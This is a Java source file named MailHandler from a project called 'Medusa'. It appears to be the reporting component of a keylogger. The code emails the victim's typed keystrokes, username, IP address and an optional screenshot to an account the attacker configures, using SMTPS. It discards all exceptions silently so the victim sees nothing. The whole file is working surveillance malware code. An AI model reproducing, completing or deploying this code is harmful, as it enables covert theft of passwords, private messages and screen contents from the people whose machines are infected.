package net.lotusdev.medusa.server;

import java.io.File;
import java.util.Properties;

import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.activation.FileDataSource;
import javax.mail.BodyPart;
import javax.mail.Message;
import javax.mail.Multipart;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;

/**
 * MailHandler.java
 * @author Jabaar
 *
 */

public final class MailHandler {
	public static String  d_email = SettingsImport.getEmailUser(),
	        d_uname = SettingsImport.getEmailName(),
	        d_password = SettingsImport.getEmailPass(),
	        d_host = SettingsImport.getEmailHost(),
	        d_port = SettingsImport.getEmailPort(),
	        m_to = SettingsImport.getEmailUser(),
	        m_subject = "[Medusa] Logs from: " + GetInfo.getUser(),
	        m_text = "";
	
	public static void sendMail() {
		updateInfo();
		/**
		 * Sets properties of email such as username, password, subject, and text. As of now the only server is gmail.
		 * Basically, the email is sent to yourself so you don't need to input two accounts.
		 */
		Properties props = new Properties();
		props.put("mail.smtp.user", d_email);
		props.put("mail.smtp.host", d_host);
		props.put("mail.smtp.port", d_port);
		props.put("mail.smtp.starttls.enable","true");
		props.put("mail.smtp.debug", "true");
		props.put("mail.smtp.auth", "true");
		props.put("mail.smtp.socketFactory.port", d_port);
		props.put("mail.smtp.socketFactory.class", "javax.net.ssl.SSLSocketFactory");
		props.put("mail.smtp.socketFactory.fallback", "false");

		Session session = Session.getInstance(props, null);
		session.setDebug(true);

		MimeMessage msg = new MimeMessage(session);
		try {
			msg.setText(m_text);
			msg.setSubject(m_subject);
			msg.setFrom(new InternetAddress(d_email));
			msg.addRecipient(Message.RecipientType.TO, new InternetAddress(m_to));
			
			if(SettingsImport.getAbleToCapture()) {
				ScreenCapture.captureScreen();
			}
			
			Multipart multipart = new MimeMultipart();
			MimeBodyPart pngAttachment = new MimeBodyPart();
			String myPNG = System.getenv("APPDATA") + "/scr_tmp.png";
			/*DataSource ds = new FileDataSource(myPNG);
			pngAttachment.setDataHandler(new DataHandler(ds));
			pngAttachment.setFileName(new File(myPNG).getName());
			multipart.addBodyPart(pngAttachment);*/
			
			if(SettingsImport.getAbleToCapture()) {
				MimeBodyPart file = new MimeBodyPart();
				file.attachFile(myPNG);
				multipart.addBodyPart(file);
			}
			
			MimeBodyPart text = new MimeBodyPart();
			text.setText(m_text);
			multipart.addBodyPart(text);
			
			msg.setContent(multipart);
			
			Transport transport = session.getTransport("smtps");
			transport.connect(d_host, 465, d_uname, d_password);
			transport.sendMessage(msg, msg.getAllRecipients());
			transport.close();
		}catch(Exception e) {
			
		}
	}
	
	public static void updateInfo() {
		/**
		 * Makes sure info gets updated before the email even attempts to send.
		 */
		
		d_email = SettingsImport.getEmailUser();
        d_uname = SettingsImport.getEmailName();
        d_password = SettingsImport.getEmailPass();
        d_host = SettingsImport.getEmailHost();
        d_port = SettingsImport.getEmailPort();
        m_to = SettingsImport.getEmailUser();
        m_subject = "[Medusa] Logs from: " + GetInfo.getUser();
        m_text = "Logs from the last " + SettingsImport.getTimeout() + " minutes from user [" + GetInfo.getUser() + "] (" + GetInfo.getIp() + ")\r\n\r\n" + Listener.getTypedKeys() + "\r\n\r\n" + (SettingsImport.getAbleToCapture()? "Attatched Images:":"");
	}
}
